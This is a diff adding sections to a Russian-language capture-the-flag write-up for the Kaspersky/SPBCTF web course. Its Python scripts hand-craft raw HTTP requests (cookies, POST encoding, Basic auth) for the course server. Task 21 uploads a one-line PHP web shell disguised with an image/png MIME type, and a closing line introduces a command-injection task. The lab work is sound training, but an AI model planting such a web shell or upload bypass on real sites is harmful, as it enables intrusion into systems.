@@ -109,6 +109,191 @@ function tryPassword() {
 curl http://kslweb1.spb.ctf.su/first//level14/index.php?give_flag=1 -o im.png
 ```
 
+## таск 15 
+
+> You should upload a file here which is exactly 1337 bytes.
+
+> Current uploaded files (PHP $_FILES[] array): Array ( )
+
+Здесь уже проще без curl. Генерим файлик через dd и грузим руками через форму
+```bash
+dd if=/dev/urandom of=f.txt bs=1 count=1337
+```
+
+## таск 16
+
+> This task requires you to write HTTP requests by hand.
+
+>  try sending each request line separately, wait some time after each line.
+
+Сначала пробуем руками - работает, но скучно. Автоматизируем на python прямо как в подсказке
+```python
+import socket, time, random
+
+with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
+    print("Connected, wait some time")
+    for line in [
+            "GET /second/level16/ HTTP/1.1",
+            "Host: kslweb1.spb.ctf.su",
+            "Connection: close", ""]:
+        sock.sendall((line + "\r\n").encode('utf-8'))
+        time.sleep(random.uniform(0.5, 3.2))
+    print(sock.recv(4096).decode())
+```
+
+## таск 17
+
+> Nope, you should send a request with at least 100 different cookies (how are cookies made in raw http?)
+
+по сути решение как в таске 7, чтобы вручную можно в bash выполнить  
+```bash
+echo "Cookie: $(printf 'a%d=1;' {1..100})"
+```
+или на python
+```python
+import socket, time, random
+
+cookies = ";".join([
+    f"a{i}=b{i}" 
+    for i in range(100)
+]) 
+# eq Cookie: a0=b0;a1=b1 ...
+
+with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
+    print("Connected, wait some time")
+    for line in [
+            "GET /second/level17/ HTTP/1.1",
+            "Host: kslweb1.spb.ctf.su",
+            f"Cookie: {cookies}",
+            "Connection: close", ""]:
+        print(line)
+        sock.sendall((line + "\r\n").encode('utf-8'))
+        time.sleep(random.uniform(0.5, 3.2))
+    print(sock.recv(4096).decode())
+```
+
+## таск 18
+
+> !!!!!!######Nope, you should send one POST field 'makers' with words 'Kaspersky & SPBCTF' (how post values are encoded?)
+
+https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)&input=S2FzcGVyc2t5ICYgU1BCQ1RG
+
+```python
+import socket, time, random
+
+with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
+    print("Connected, wait some time")
+    data = "makers=Kaspersky+%26+SPBCTF" # url encoding
+    for line in [
+            "POST /second/level18/ HTTP/1.1",
+            "Host: kslweb1.spb.ctf.su",
+            "Content-Type: application/x-www-form-urlencoded",
+            f"Content-Length: {len(data)}",
+            "Connection: close", "", data, ""]:
+        print(line)
+        sock.sendall((line + "\r\n").encode('utf-8'))
+        time.sleep(random.uniform(0.5, 3.2))
+    print(sock.recv(4096).decode())
+```
+
+## таск 19
+
+> Nope, you should send one POST field 'smiley' with this exact face - it contains 6 lines of text
+
+> (how post values are encoded? if google doesnt help maybe we can see how it is transmitted on some other website?)
+
+```python
+import socket, time, random
+from urllib.parse import quote
+
+smiley = """+|||||+
+| - - |
+| O_o |
+|  |  |
+| \__ |
+ \___/"""
+enc = quote(smiley)
+
+with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
+    print("Connected, wait some time")
+    data = f"smiley={enc}"
+    for line in [
+            "POST /second/level19/ HTTP/1.1",
+            "Host: kslweb1.spb.ctf.su",
+            "Content-Type: application/x-www-form-urlencoded",
+            f"Content-Length: {len(data)}",
+            "Connection: close", "", data, ""]:
+        print(line)
+        sock.sendall((line + "\r\n").encode('utf-8'))
+        time.sleep(random.uniform(0.5, 3.2))
+    print(sock.recv(4096).decode())
+```
+## таск 20
+
+> Nope, you should send a Basic authentication with your request (how does basic auth work?)
+
+> Username: admin
+
+> Password: s3cr3tp4$$w0RD
+
+```python
+import socket, time, random, base64
+
+creds = "admin:s3cr3tp4$$w0RD"
+enc = base64.b64encode(
+    creds.encode('utf-8')  # encode for b64 input
+).decode('utf-8') # decode output back to utf str
+
+with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
+    print("Connected, wait some time")
+    for line in [
+            "GET /second/level20/ HTTP/1.1",
+            "Host: kslweb1.spb.ctf.su",
+            f"Authorization: Basic {enc}",
+            "Connection: close", ""]:
+        print(line)
+        sock.sendall((line + "\r\n").encode('utf-8'))
+        time.sleep(random.uniform(0.5, 3.2))
+    print(sock.recv(4096).decode())
+```
+
+## таск 21
+
+> You should upload a file here with name ending in .php (for example, 'shell.php') but MIME type 'image/png'
+
+```html
+File: <input type='file' name='myfile' /> <input type='submit' value='Upload &raquo;' /></form>
+```
+следовательно имя myfile, имя файла shell.php и тип image/png
+
+```python
+import socket, time, random
+
+with socket.create_connection(('kslweb1.spb.ctf.su', 58080)) as sock:
+    print("Connected, wait some time")
+    boundary = f"----WebBoundary{random.randint(1000,9999)}"
+    data = [
+        f"--{boundary}",
+        "Content-Disposition: form-data; name=\"myfile\"; filename=\"shell.php\"",
+        "Content-Type: image/png",
+        "",
+        "<?=`$_GET[0]`?>",  # from https://www.revshells.com/ , just for fun
+        f"--{boundary}--"
+    ]
+    for line in [
+        "POST /second/level21/ HTTP/1.1",
+        "Host: kslweb1.spb.ctf.su",
+        f"Content-Type: multipart/form-data; boundary={boundary}",
+        f"Content-Length: {sum(len(l)+2 for l in data)}",
+        "Connection: close", ""
+    ] + data + ["",]:
+        print(line)
+        sock.sendall((line + "\r\n").encode('utf-8'))
+        time.sleep(random.uniform(0.5, 3.2))
+    print(sock.recv(4096).decode())
+```
+
+## таски 24 - 28 недоступны 
 ## таск 29 sh
 
 Пользовательский ввод напрямую вставляется в команду баша, затем вывод из stdout, нужно отрезать лишнее и обойти ошибки.
